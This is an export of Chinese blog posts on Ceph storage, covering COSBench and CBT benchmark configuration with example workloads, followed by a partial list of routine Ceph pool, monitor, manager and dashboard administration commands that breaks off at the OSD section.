class="hljs-string">&quot;init&quot;</span> <span class="hljs-attr">workers</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">config</span>=<span class="hljs-string">&quot;cprefix=s3testqwer;containers=r(1,2)&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">workstage</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">workstage</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;prepare&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">work</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;prepare&quot;</span> <span class="hljs-attr">workers</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">config</span>=<span class="hljs-string">&quot;cprefix=s3testqwer;containers=r(1,2);objects=r(1,10);sizes=c(64)KB&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">workstage</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">workstage</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;main&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">work</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;main&quot;</span> <span class="hljs-attr">workers</span>=<span class="hljs-string">&quot;8&quot;</span> <span class="hljs-attr">runtime</span>=<span class="hljs-string">&quot;30&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">operation</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;read&quot;</span> <span class="hljs-attr">ratio</span>=<span class="hljs-string">&quot;80&quot;</span> <span class="hljs-attr">config</span>=<span class="hljs-string">&quot;cprefix=s3testqwer;containers=u(1,2);objects=u(1,10)&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">operation</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;write&quot;</span> <span class="hljs-attr">ratio</span>=<span class="hljs-string">&quot;20&quot;</span> <span class="hljs-attr">config</span>=<span class="hljs-string">&quot;cprefix=s3testqwer;containers=u(1,2);objects=u(11,20);sizes=c(64)KB&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">work</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">workstage</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">workstage</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;cleanup&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">work</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;cleanup&quot;</span> <span class="hljs-attr">workers</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">config</span>=<span class="hljs-string">&quot;cprefix=s3testqwer;containers=r(1,2);objects=r(1,20)&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">workstage</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">workstage</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;dispose&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">work</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;dispose&quot;</span> <span class="hljs-attr">workers</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">config</span>=<span class="hljs-string">&quot;cprefix=s3testqwer;containers=r(1,2)&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">workstage</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">workflow</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">workload</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>字段解释:</strong></p><ul><li><code>workload</code> : 测试任务详情。 name 为任务名称。description 为任务描述信息。</li><li><code>storage</code> : 存储详情。 type 为存储类型，这里为 s3 。 config 为存储类型对应的配置(endpoint 格式为 host:port)。 默认的 config 配置模板中并没有给出 path_style_access 参数，在使用 ceph rgw 的时候需要将该值设置为 true ，否则会出现 auth 错误。</li><li><code>workflow</code> : 工作流详情。</li><li><code>workstage</code> : 工作流阶段。 name 为工作流阶段名称。</li><li><code>work</code> : 具体工作详情， type 对应 workstage name 。 workers 表示执行该阶段的时候开启多少个工作线程。 runtime 表示运行的时间，时间默认为秒。<ul><li><code>init</code> : 初始化阶段，主要是进行 bucket 的创建。 cprefix 为 bucket 的名称前缀， containers 表示 bucket 的拼接的后缀。</li><li><code>prepare</code> : 配置为 bucket 写入的数据， workers 和 部分 config 含义与 init 阶段相同，除此之外还需要配置 objects ，表示一轮写入多少个对象，以及 object 的大小。</li><li><code>main</code> : 进行测试的阶段。</li><li><code>cleanup</code> : 进行环境的清理，主要是删除 bucket 中的数据，保证测试后的数据不会保留在集群中。</li><li><code>dispose</code> : 删除 bucket 。</li></ul></li><li><code>operation</code> : 操作详情。 type 为操作类型，可选值为 read&#x2F;write&#x2F;delete 等。 ratio 表示该操作所占有操作的比例。 config 配置 bucket 的前缀后缀等信息。</li></ul><h2 id="8-2、测试命令示例"><a href="#8-2、测试命令示例" class="headerlink" title="8.2、测试命令示例"></a>8.2、测试命令示例</h2><p><strong>示例配置:</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">workload</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ceph-rgw-bench&quot;</span> <span class="hljs-attr">description</span>=<span class="hljs-string">&quot;ceph rgw bench&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">storage</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;s3&quot;</span> <span class="hljs-attr">config</span>=<span class="hljs-string">&quot;accesskey=8JCZSOON4U9AI90CSSTQ;secretkey=b6CzA1fXvG0auCBd3irVjHAZD3URtSrPAh40F2nB;endpoint=http://$ADDR:$PORT;path_style_access=true&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">workflow</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">workstage</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;init&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">work</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;init&quot;</span> <span class="hljs-attr">workers</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">config</span>=<span class="hljs-string">&quot;cprefix=cephs3cosbench;containers=r(1,2)&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">workstage</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">workstage</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;prepare&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">work</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;prepare&quot;</span> <span class="hljs-attr">workers</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">config</span>=<span class="hljs-string">&quot;cprefix=cephs3cosbench;containers=r(1,2);objects=r(1,10);sizes=c(64)KB&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">workstage</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">workstage</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;main&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">work</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;main&quot;</span> <span class="hljs-attr">workers</span>=<span class="hljs-string">&quot;4&quot;</span> <span class="hljs-attr">runtime</span>=<span class="hljs-string">&quot;30&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">operation</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;read&quot;</span> <span class="hljs-attr">ratio</span>=<span class="hljs-string">&quot;80&quot;</span> <span class="hljs-attr">config</span>=<span class="hljs-string">&quot;cprefix=cephs3cosbench;containers=u(1,2);objects=u(1,10)&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">operation</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;write&quot;</span> <span class="hljs-attr">ratio</span>=<span class="hljs-string">&quot;20&quot;</span> <span class="hljs-attr">config</span>=<span class="hljs-string">&quot;cprefix=cephs3cosbench;containers=u(1,2);objects=u(11,20);sizes=c(64)KB&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">work</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">workstage</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">workstage</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;cleanup&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">work</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;cleanup&quot;</span> <span class="hljs-attr">workers</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">config</span>=<span class="hljs-string">&quot;cprefix=cephs3cosbench;containers=r(1,2);objects=r(1,20)&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">workstage</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">workstage</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;dispose&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">work</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;dispose&quot;</span> <span class="hljs-attr">workers</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">config</span>=<span class="hljs-string">&quot;cprefix=cephs3cosbench;containers=r(1,2)&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">workstage</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">workflow</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">workload</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 提交任务执行</span><br>./cli.sh submit conf/cephrgw.xml<br></code></pre></td></tr></table></figure><h1 id="九、cbt"><a href="#九、cbt" class="headerlink" title="九、cbt"></a>九、cbt</h1><p><strong>用途:</strong></p><ul><li>测试块存储性能；</li><li>测试文件存储性能(借助于 fio 等)；</li><li>测试对象存储性能(借助于 cosbench 和 hsbench )；</li><li>测试 ceph rados 对象存储性能(借助于 rados bench)；</li></ul><p>CBT 全称为 Ceph Benchmarking Tool ，是官方推出的一个用 Python 编写的测试工具，可以自动执行与 Ceph 集群性能测试相关的各种任务。</p><p><strong>环境初始化与安装:</strong></p><ul><li>测试节点间配置 SSH 免密访问，且用户启用无密码 sudo 访问权限；</li><li>每台机器节点都需要安装所需要的 Ceph 及其他测试软件；</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装依赖软件</span><br>dnf install pdsh<br><br><span class="hljs-comment"># 软件下载</span><br>wget https://github.com/ceph/cbt/archive/refs/tags/v0.3.tar.gz<br>tar -zxvf v0.3.tar.gz<br><span class="hljs-built_in">cd</span> cbt-0.3<br><br><span class="hljs-comment"># 测试运行</span><br>./cbt.py --<span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure><h2 id="9-1、测试配置参数"><a href="#9-1、测试配置参数" class="headerlink" title="9.1、测试配置参数"></a>9.1、测试配置参数</h2><p><strong>配置文件参数:</strong> (测试文件官方文档: <a href="https://github.com/ceph/cbt/blob/v0.3/docs/TestPlanSchema.md">https://github.com/ceph/cbt/blob/v0.3/docs/TestPlanSchema.md</a>)</p><ul><li><code>common</code> : </li><li><code>cluster</code> : 必需配置。Ceph 集群的详细配置，以下仅列出部分配置，详细配置: <a href="https://github.com/ceph/cbt/blob/v0.3/cluster/ceph.py#L93">https://github.com/ceph/cbt/blob/v0.3/cluster/ceph.py#L93</a><ul><li><code>user</code> : </li><li><code>head</code> : 表示启动集群的节点;</li><li><code>clients</code> : 每个客户端都是一个字符串，表示安装了基准可执行文件的可通过 ssh 访问的主机；</li><li><code>osds</code> : 每个节点至少有一个正在运行的 OSD 进程；</li><li><code>mons</code> : mon 节点列表；</li><li><code>rgws</code> : rgw 节点列表；</li><li><code>mdss</code> : mds 节点列表；</li><li><code>mgrs</code> : mgr 节点列表；</li><li><code>conf_file</code> : 如果 cbt.py 启动命令参数中指定了 <code>-c/--conf</code> ， 则会覆盖该值。如果这两处都没有指定该值，则使用默认值 &#x2F;etc&#x2F;ceph&#x2F;ceph.conf 。</li><li><code>use_existing</code> : 使用现有的集群，默认为 True ；</li><li><code>tmp_dir</code> : 每个节点机器上的集群目录，默认为 &#x2F;tmp&#x2F;cbt.$PID ；</li><li><code>rebuild_every_test</code> : 是否每次测试前重建集群。可选配置。默认为 False 。</li><li><code>health_wait</code> : 默认为 5</li><li><code>fs</code> : 指定 osd 运行的文件系统，可选值为 tmpfs&#x2F;zfs 等，无默认值；</li></ul></li><li><code>benchmarks</code> : 必需配置。基准部分由一个非空集合列表组成，每个集合描述一个基准测试实体。基类详细配置: <a href="https://github.com/ceph/cbt/blob/v0.3/benchmark/benchmark.py#L15">https://github.com/ceph/cbt/blob/v0.3/benchmark/benchmark.py#L15</a><ul><li><code>nullbench</code> : 详细配置: <a href="https://github.com/ceph/cbt/blob/v0.3/benchmark/nullbench.py#L6">https://github.com/ceph/cbt/blob/v0.3/benchmark/nullbench.py#L6</a></li><li><code>radosbench</code> : 详细配置: <a href="https://github.com/ceph/cbt/blob/v0.3/benchmark/radosbench.py#L18">https://github.com/ceph/cbt/blob/v0.3/benchmark/radosbench.py#L18</a></li><li><code>fio</code> : 详细配置: <a href="https://github.com/ceph/cbt/blob/v0.3/benchmark/fio.py#L16">https://github.com/ceph/cbt/blob/v0.3/benchmark/fio.py#L16</a></li><li><code>hsbench</code> : 详细配置: <a href="https://github.com/ceph/cbt/blob/v0.3/benchmark/hsbench.py#L16">https://github.com/ceph/cbt/blob/v0.3/benchmark/hsbench.py#L16</a></li><li><code>rbdfio</code> : 详细配置: <a href="https://github.com/ceph/cbt/blob/v0.3/benchmark/rbdfio.py#L15">https://github.com/ceph/cbt/blob/v0.3/benchmark/rbdfio.py#L15</a></li><li><code>kvmrbdfio</code> : 详细配置: <a href="https://github.com/ceph/cbt/blob/v0.3/benchmark/kvmrbdfio.py#L15">https://github.com/ceph/cbt/blob/v0.3/benchmark/kvmrbdfio.py#L15</a></li><li><code>rawfio</code> : 详细配置: <a href="https://github.com/ceph/cbt/blob/v0.3/benchmark/rawfio.py#L14">https://github.com/ceph/cbt/blob/v0.3/benchmark/rawfio.py#L14</a></li><li><code>librbdfio</code> : 详细配置: <a href="https://github.com/ceph/cbt/blob/v0.3/benchmark/librbdfio.py#L21">https://github.com/ceph/cbt/blob/v0.3/benchmark/librbdfio.py#L21</a></li><li><code>cosbench</code> : 详细配置: <a href="https://github.com/ceph/cbt/blob/v0.3/benchmark/cosbench.py#L18">https://github.com/ceph/cbt/blob/v0.3/benchmark/cosbench.py#L18</a></li><li><code>cephtestrados</code> : 详细配置: <a href="https://github.com/ceph/cbt/blob/v0.3/benchmark/cephtestrados.py#L14">https://github.com/ceph/cbt/blob/v0.3/benchmark/cephtestrados.py#L14</a></li><li><code>getput</code> : 详细配置: <a href="https://github.com/ceph/cbt/blob/v0.3/benchmark/getput.py#L16">https://github.com/ceph/cbt/blob/v0.3/benchmark/getput.py#L16</a></li></ul></li><li><code>monitoring_profiles</code> : </li><li><code>client_endpoints</code> : 包含一个非空的集合列表，每个集合都与一个基准测试实体关联，通常指示基准测试的驱动程序。如果在测试计划中指定了 client_endpoints ，则基准测试部分必须对其进行交叉引用，因此，在测试计划中， client_endpoints 部分通常位于基准测试部分之前。</li></ul><p><strong>启动命令参数:</strong></p><ul><li><code>-a/--archive</code> : 必需参数，用于指定结果应该存档的目录；</li><li><code>-c/--conf</code> : 可选参数，用于指定要使用的 ceph.conf 文件；</li><li><code>config_file</code> : 指定 YAML 配置文件；</li></ul><h2 id="9-2、测试命令示例"><a href="#9-2、测试命令示例" class="headerlink" title="9.2、测试命令示例"></a>9.2、测试命令示例</h2><h3 id="9-2-1、测试块存储示例"><a href="#9-2-1、测试块存储示例" class="headerlink" title="9.2.1、测试块存储示例"></a>9.2.1、测试块存储示例</h3><p><strong>配置文件:</strong></p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-bullet">-</span><br></code></pre></td></tr></table></figure><p><strong>测试命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> output<br>cbt.py --archive=./output ./rbdbench.yaml<br></code></pre></td></tr></table></figure><h3 id="9-2-2、测试文件存储示例"><a href="#9-2-2、测试文件存储示例" class="headerlink" title="9.2.2、测试文件存储示例"></a>9.2.2、测试文件存储示例</h3><p><strong>配置文件:</strong></p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-bullet">-</span><br></code></pre></td></tr></table></figure><p><strong>测试命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> output<br>cbt.py --archive=./output ./fsbench.yaml<br></code></pre></td></tr></table></figure><h3 id="9-2-3、测试对象存储示例"><a href="#9-2-3、测试对象存储示例" class="headerlink" title="9.2.3、测试对象存储示例"></a>9.2.3、测试对象存储示例</h3><p><strong>配置文件:</strong></p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-bullet">-</span><br></code></pre></td></tr></table></figure><p><strong>测试命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> output<br>cbt.py --archive=./output ./rgwbench.yaml<br></code></pre></td></tr></table></figure><h3 id="9-2-4、测试-ceph-rados-对象存储示例"><a href="#9-2-4、测试-ceph-rados-对象存储示例" class="headerlink" title="9.2.4、测试 ceph rados 对象存储示例"></a>9.2.4、测试 ceph rados 对象存储示例</h3><p><strong>配置文件:</strong></p><figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-bullet">-</span><br></code></pre></td></tr></table></figure><p><strong>测试命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> output<br>cbt.py --archive=./output ./radosbench.yaml<br></code></pre></td></tr></table></figure><h1 id="十、相关资料"><a href="#十、相关资料" class="headerlink" title="十、相关资料"></a>十、相关资料</h1><ul><li>ceph 性能测试: <a href="https://ivanzz1001.github.io/records/post/ceph/2017/07/28/ceph-benchmark">https://ivanzz1001.github.io/records/post/ceph/2017/07/28/ceph-benchmark</a></li><li>Benchmark Ceph Cluster Performance: <a href="https://tracker.ceph.com/projects/ceph/wiki/Benchmark_Ceph_Cluster_Performance">https://tracker.ceph.com/projects/ceph/wiki/Benchmark_Ceph_Cluster_Performance</a></li><li>fio github repo: <a href="https://github.com/axboe/fio">https://github.com/axboe/fio</a></li><li>ceph 一般基准性能测试准则: <a href="https://yourcmc.ru/wiki/Ceph_performance#General_benchmarking_principles">https://yourcmc.ru/wiki/Ceph_performance#General_benchmarking_principles</a></li><li>Curve 块存储与 Ceph 在 nvme 场景下的性能对比: <a href="https://zhuanlan.zhihu.com/p/579733885">https://zhuanlan.zhihu.com/p/579733885</a></li><li>SmartX 分布式块存储与商用 Ceph 存储产品性能对比: <a href="https://www.smartx.com/blog/2021/01/zbs-vs-ceph">https://www.smartx.com/blog/2021/01/zbs-vs-ceph</a></li><li>提升200倍！ScaleFlash极客天成NVMatrix全闪存与Ceph全闪存性能对比: <a href="https://www.scaleflash.com/?p=32196">https://www.scaleflash.com/?p=32196</a></li><li>vdbench存储性能测试工具: <a href="https://www.cnblogs.com/luxf0/p/13321077.html">https://www.cnblogs.com/luxf0/p/13321077.html</a></li><li>vdbench source code: <a href="https://www.oracle.com/downloads/server-storage/vdbench-source-downloads.html">https://www.oracle.com/downloads/server-storage/vdbench-source-downloads.html</a></li><li>vdbench doc: <a href="https://goodcommand.readthedocs.io/zh_CN/v1.0.0/io_benchmark">https://goodcommand.readthedocs.io/zh_CN/v1.0.0/io_benchmark</a></li><li>vdbench 的使用教程——裸盘测试和文件系统测试vdbanch: <a href="https://blog.csdn.net/bandaoyu/article/details/121568182">https://blog.csdn.net/bandaoyu/article/details/121568182</a></li><li>Vdbench Users Guide: <a href="https://www.oracle.com/technetwork/server-storage/vdbench-1901683.pdf">https://www.oracle.com/technetwork/server-storage/vdbench-1901683.pdf</a></li><li>vdbench常见测试模型: <a href="https://www.cnblogs.com/xzy186/p/15944228.html">https://www.cnblogs.com/xzy186/p/15944228.html</a></li><li>mdtest github repo: <a href="https://github.com/hpc/ior">https://github.com/hpc/ior</a></li><li>mdtest wiki: <a href="https://wiki.lustre.org/MDTest">https://wiki.lustre.org/MDTest</a></li><li><a href="https://ior.readthedocs.io/en/latest">https://ior.readthedocs.io/en/latest</a></li><li>mdtest 基准测试: <a href="https://juicefs.com/docs/zh/community/mdtest">https://juicefs.com/docs/zh/community/mdtest</a></li><li>使用 mdtest 测试文件系统元数据性能: <a href="https://gukaifeng.cn/posts/shi-yong-mdtest-ce-shi-wen-jian-xi-tong-yuan-shu-ju-xing-neng/index.html">https://gukaifeng.cn/posts/shi-yong-mdtest-ce-shi-wen-jian-xi-tong-yuan-shu-ju-xing-neng/index.html</a></li><li>iozone home: <a href="https://www.iozone.org/">https://www.iozone.org/</a></li><li>iozone 的安装及使用教程: <a href="https://blog.qiql.net/archives/iozone">https://blog.qiql.net/archives/iozone</a></li><li>Ceph 对象存储使用: <a href="https://www.51cto.com/article/684376.html">https://www.51cto.com/article/684376.html</a></li><li>Ceph Object Gateway: <a href="https://docs.ceph.com/en/latest/radosgw">https://docs.ceph.com/en/latest/radosgw</a></li><li>Pool Placement and Storage Classes: <a href="https://docs.ceph.com/en/latest/radosgw/placement">https://docs.ceph.com/en/latest/radosgw/placement</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Ceph </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ceph 常用命令汇总</title>
      <link href="/2023/05/01/ceph-cmd/"/>
      <url>/2023/05/01/ceph-cmd/</url>
      
        <content type="html"><![CDATA[<h1 id="一、常用命令"><a href="#一、常用命令" class="headerlink" title="一、常用命令"></a>一、常用命令</h1><h2 id="1-1、Pool"><a href="#1-1、Pool" class="headerlink" title="1.1、Pool"></a>1.1、Pool</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看 pool</span><br>ceph osd pool <span class="hljs-built_in">ls</span> detail<br><br><span class="hljs-comment"># 创建 pool</span><br>ceph osd pool create testpool 32 32<br>ceph osd pool <span class="hljs-built_in">set</span> testpool pg_autoscale_mode off<br><br><span class="hljs-comment"># 调整 pool pg/pgp , 并关闭自动调整</span><br>ceph osd pool <span class="hljs-built_in">set</span> testpool pg_num 32<br>ceph osd pool <span class="hljs-built_in">set</span> testpool pgp_num 32<br>ceph osd pool <span class="hljs-built_in">set</span> testpool pg_autoscale_mode off<br><br><span class="hljs-comment"># 设置 pool 最小副本</span><br>ceph osd pool <span class="hljs-built_in">set</span> testpool min_size 1<br>ceph osd pool <span class="hljs-built_in">set</span> testpool size 1 --yes-i-really-mean-it<br><br><span class="hljs-comment"># 移除 pool</span><br>ceph tell mon.\* injectargs <span class="hljs-string">&#x27;--mon-allow-pool-delete=true&#x27;</span><br>ceph osd pool delete testpool testpool --yes-i-really-really-mean-it<br>ceph tell mon.\* injectargs <span class="hljs-string">&#x27;--mon-allow-pool-delete=false&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="1-2、Monitor"><a href="#1-2、Monitor" class="headerlink" title="1.2、Monitor"></a>1.2、Monitor</h2><p>当集群机器迁移等场景下导致的机器 ip 发生变化时，我们需要停止对应 monitor 并在修改 mon map 中的节点 ip 后重启。</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 导出 monmap 配置</span><br><span class="hljs-built_in">rm</span> -rf ./monmap<br>ceph mon getmap -o ./monmap<br>monmaptool --<span class="hljs-built_in">print</span> ./monmap<br><br><span class="hljs-comment"># 修改 monmap</span><br><span class="hljs-comment"># 删除 monmap 中的老的 monitor 信息</span><br>monmaptool --<span class="hljs-built_in">print</span> ./monmap<br>monmaptool --<span class="hljs-built_in">rm</span> host01 --<span class="hljs-built_in">rm</span> host02 --<span class="hljs-built_in">rm</span> host03 ./monmap<br>monmaptool --<span class="hljs-built_in">print</span> ./monmap<br><br><span class="hljs-comment"># 修改 monmap</span><br><span class="hljs-comment"># 向 monmap 中新增 monitor 信息（两种ip变更场景中需要用到的配置，这里的地址必选使用 ipv4 ，不支持 ipv6 和域名）</span><br>monmaptool --<span class="hljs-built_in">print</span> ./monmap<br>monmaptool --addv host01 [v2:10.10.99.1:3300/0,v1:10.10.99.1:6789/0] ./monmap<br>monmaptool --addv host02 [v2:10.10.99.2:3300/0,v1:10.10.99.2:6789/0] ./monmap<br>monmaptool --addv host03 [v2:10.10.99.3:3300/0,v1:10.10.99.3:6789/0] ./monmap<br>monmaptool --<span class="hljs-built_in">print</span> ./monmap<br><br><span class="hljs-comment"># 向 monitor 中注入 monmap</span><br><span class="hljs-comment"># 需要停止对应的 monitor , 该操作会将数据写入 rocksdb 存储中，需要分别在不同的 monitor 机器上执行对应的命令</span><br>ceph-mon -i host01 --inject-monmap ./monmap<br>ceph-mon -i host02 --inject-monmap ./monmap<br>ceph-mon -i host03 --inject-monmap ./monmap<br><br><br><span class="hljs-comment"># 查看日志配置（内部包含日志审计的相关配置）</span><br>ceph tell mon.* config get mon_cluster_log_file<br>ceph tell mon.* config get mon_cluster_log_file_level<br>ceph tell mon.* config get mon_cluster_log_to_stderr<br>ceph tell mon.* config get mon_cluster_log_to_syslog<br>ceph tell mon.* config get mon_cluster_log_to_syslog_level<br>ceph tell mon.* config get mon_cluster_log_to_syslog_facility<br>ceph tell mon.* config get mon_cluster_log_to_graylog<br>ceph tell mon.* config get mon_cluster_log_to_graylog_host<br>ceph tell mon.* config get mon_cluster_log_to_graylog_port<br>ceph tell mon.* config get clog_to_monitors<br>ceph tell mon.* config get clog_to_syslog<br>ceph tell mon.* config get clog_to_syslog_level<br>ceph tell mon.* config get clog_to_syslog_facility<br>ceph tell mon.* config get clog_to_graylog<br>ceph tell mon.* config get clog_to_graylog_host<br>ceph tell mon.* config get clog_to_graylog_port<br><br><span class="hljs-comment"># 修改配置</span><br>ceph tell mon.* config <span class="hljs-built_in">set</span> mon_cluster_log_file <span class="hljs-string">&quot;default=/var/log/ceph/x1-ceph.\$channel.log cluster=/var/log/ceph/x1-ceph.log&quot;</span><br></code></pre></td></tr></table></figure><h2 id="1-3、Manager"><a href="#1-3、Manager" class="headerlink" title="1.3、Manager"></a>1.3、Manager</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看 module 列表</span><br>ceph mgr module <span class="hljs-built_in">ls</span><br><br><span class="hljs-comment"># 查看 module 列表，并筛选自动开启的 module</span><br>ceph mgr module <span class="hljs-built_in">ls</span> | jq .always_on_modules<br><br><span class="hljs-comment"># 查看 module 列表，并筛选已经启用的 module</span><br>ceph mgr module <span class="hljs-built_in">ls</span> | jq .enabled_modules<br><br><span class="hljs-comment"># 查看 module 列表，并筛选禁用的 module</span><br>ceph mgr module <span class="hljs-built_in">ls</span> | jq .disabled_modules[].name<br><br><span class="hljs-comment"># 启动 module (启动 alert module)</span><br>ceph mgr module <span class="hljs-built_in">enable</span> alert<br><br><span class="hljs-comment"># 停止 module (停止 alert module)</span><br>ceph mgr module <span class="hljs-built_in">disable</span> alert<br></code></pre></td></tr></table></figure><h3 id="1-3-1、Dashboard"><a href="#1-3-1、Dashboard" class="headerlink" title="1.3.1、Dashboard"></a>1.3.1、Dashboard</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看配置</span><br>ceph config dump<br><br><span class="hljs-comment"># 修改配置</span><br>ceph config <span class="hljs-built_in">set</span> mgr mgr/dashboard/ALERTMANAGER_API_HOST http://10.10.99.1:9093<br>ceph config <span class="hljs-built_in">set</span> mgr mgr/dashboard/PROMETHEUS_API_HOST http://10.10.99.1:9092<br>ceph config <span class="hljs-built_in">set</span> mgr mgr/dashboard/GRAFANA_API_URL http://10.10.99.1:3000<br>ceph config <span class="hljs-built_in">set</span> mgr mgr/dashboard/server_addr 10.10.99.1<br>ceph config <span class="hljs-built_in">set</span> mgr mgr/dashboard/host01/server_addr 10.10.99.1<br>ceph config <span class="hljs-built_in">set</span> mgr mgr/dashboard/host02/server_addr 10.10.99.2<br>ceph config <span class="hljs-built_in">set</span> mgr mgr/dashboard/host03/server_addr 10.10.99.3<br><br><span class="hljs-comment"># 重置 dashboard 密码</span><br><span class="hljs-built_in">rm</span> -rf dashboard_password.ini<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;password&quot;</span> &gt; dashboard_password.ini<br>ceph dashboard ac-user-set-password admin -i dashboard_password.ini<br></code></pre></td></tr></table></figure><h2 id="1-4、OSD"><a href="#1-4、OSD" class="headerlink" 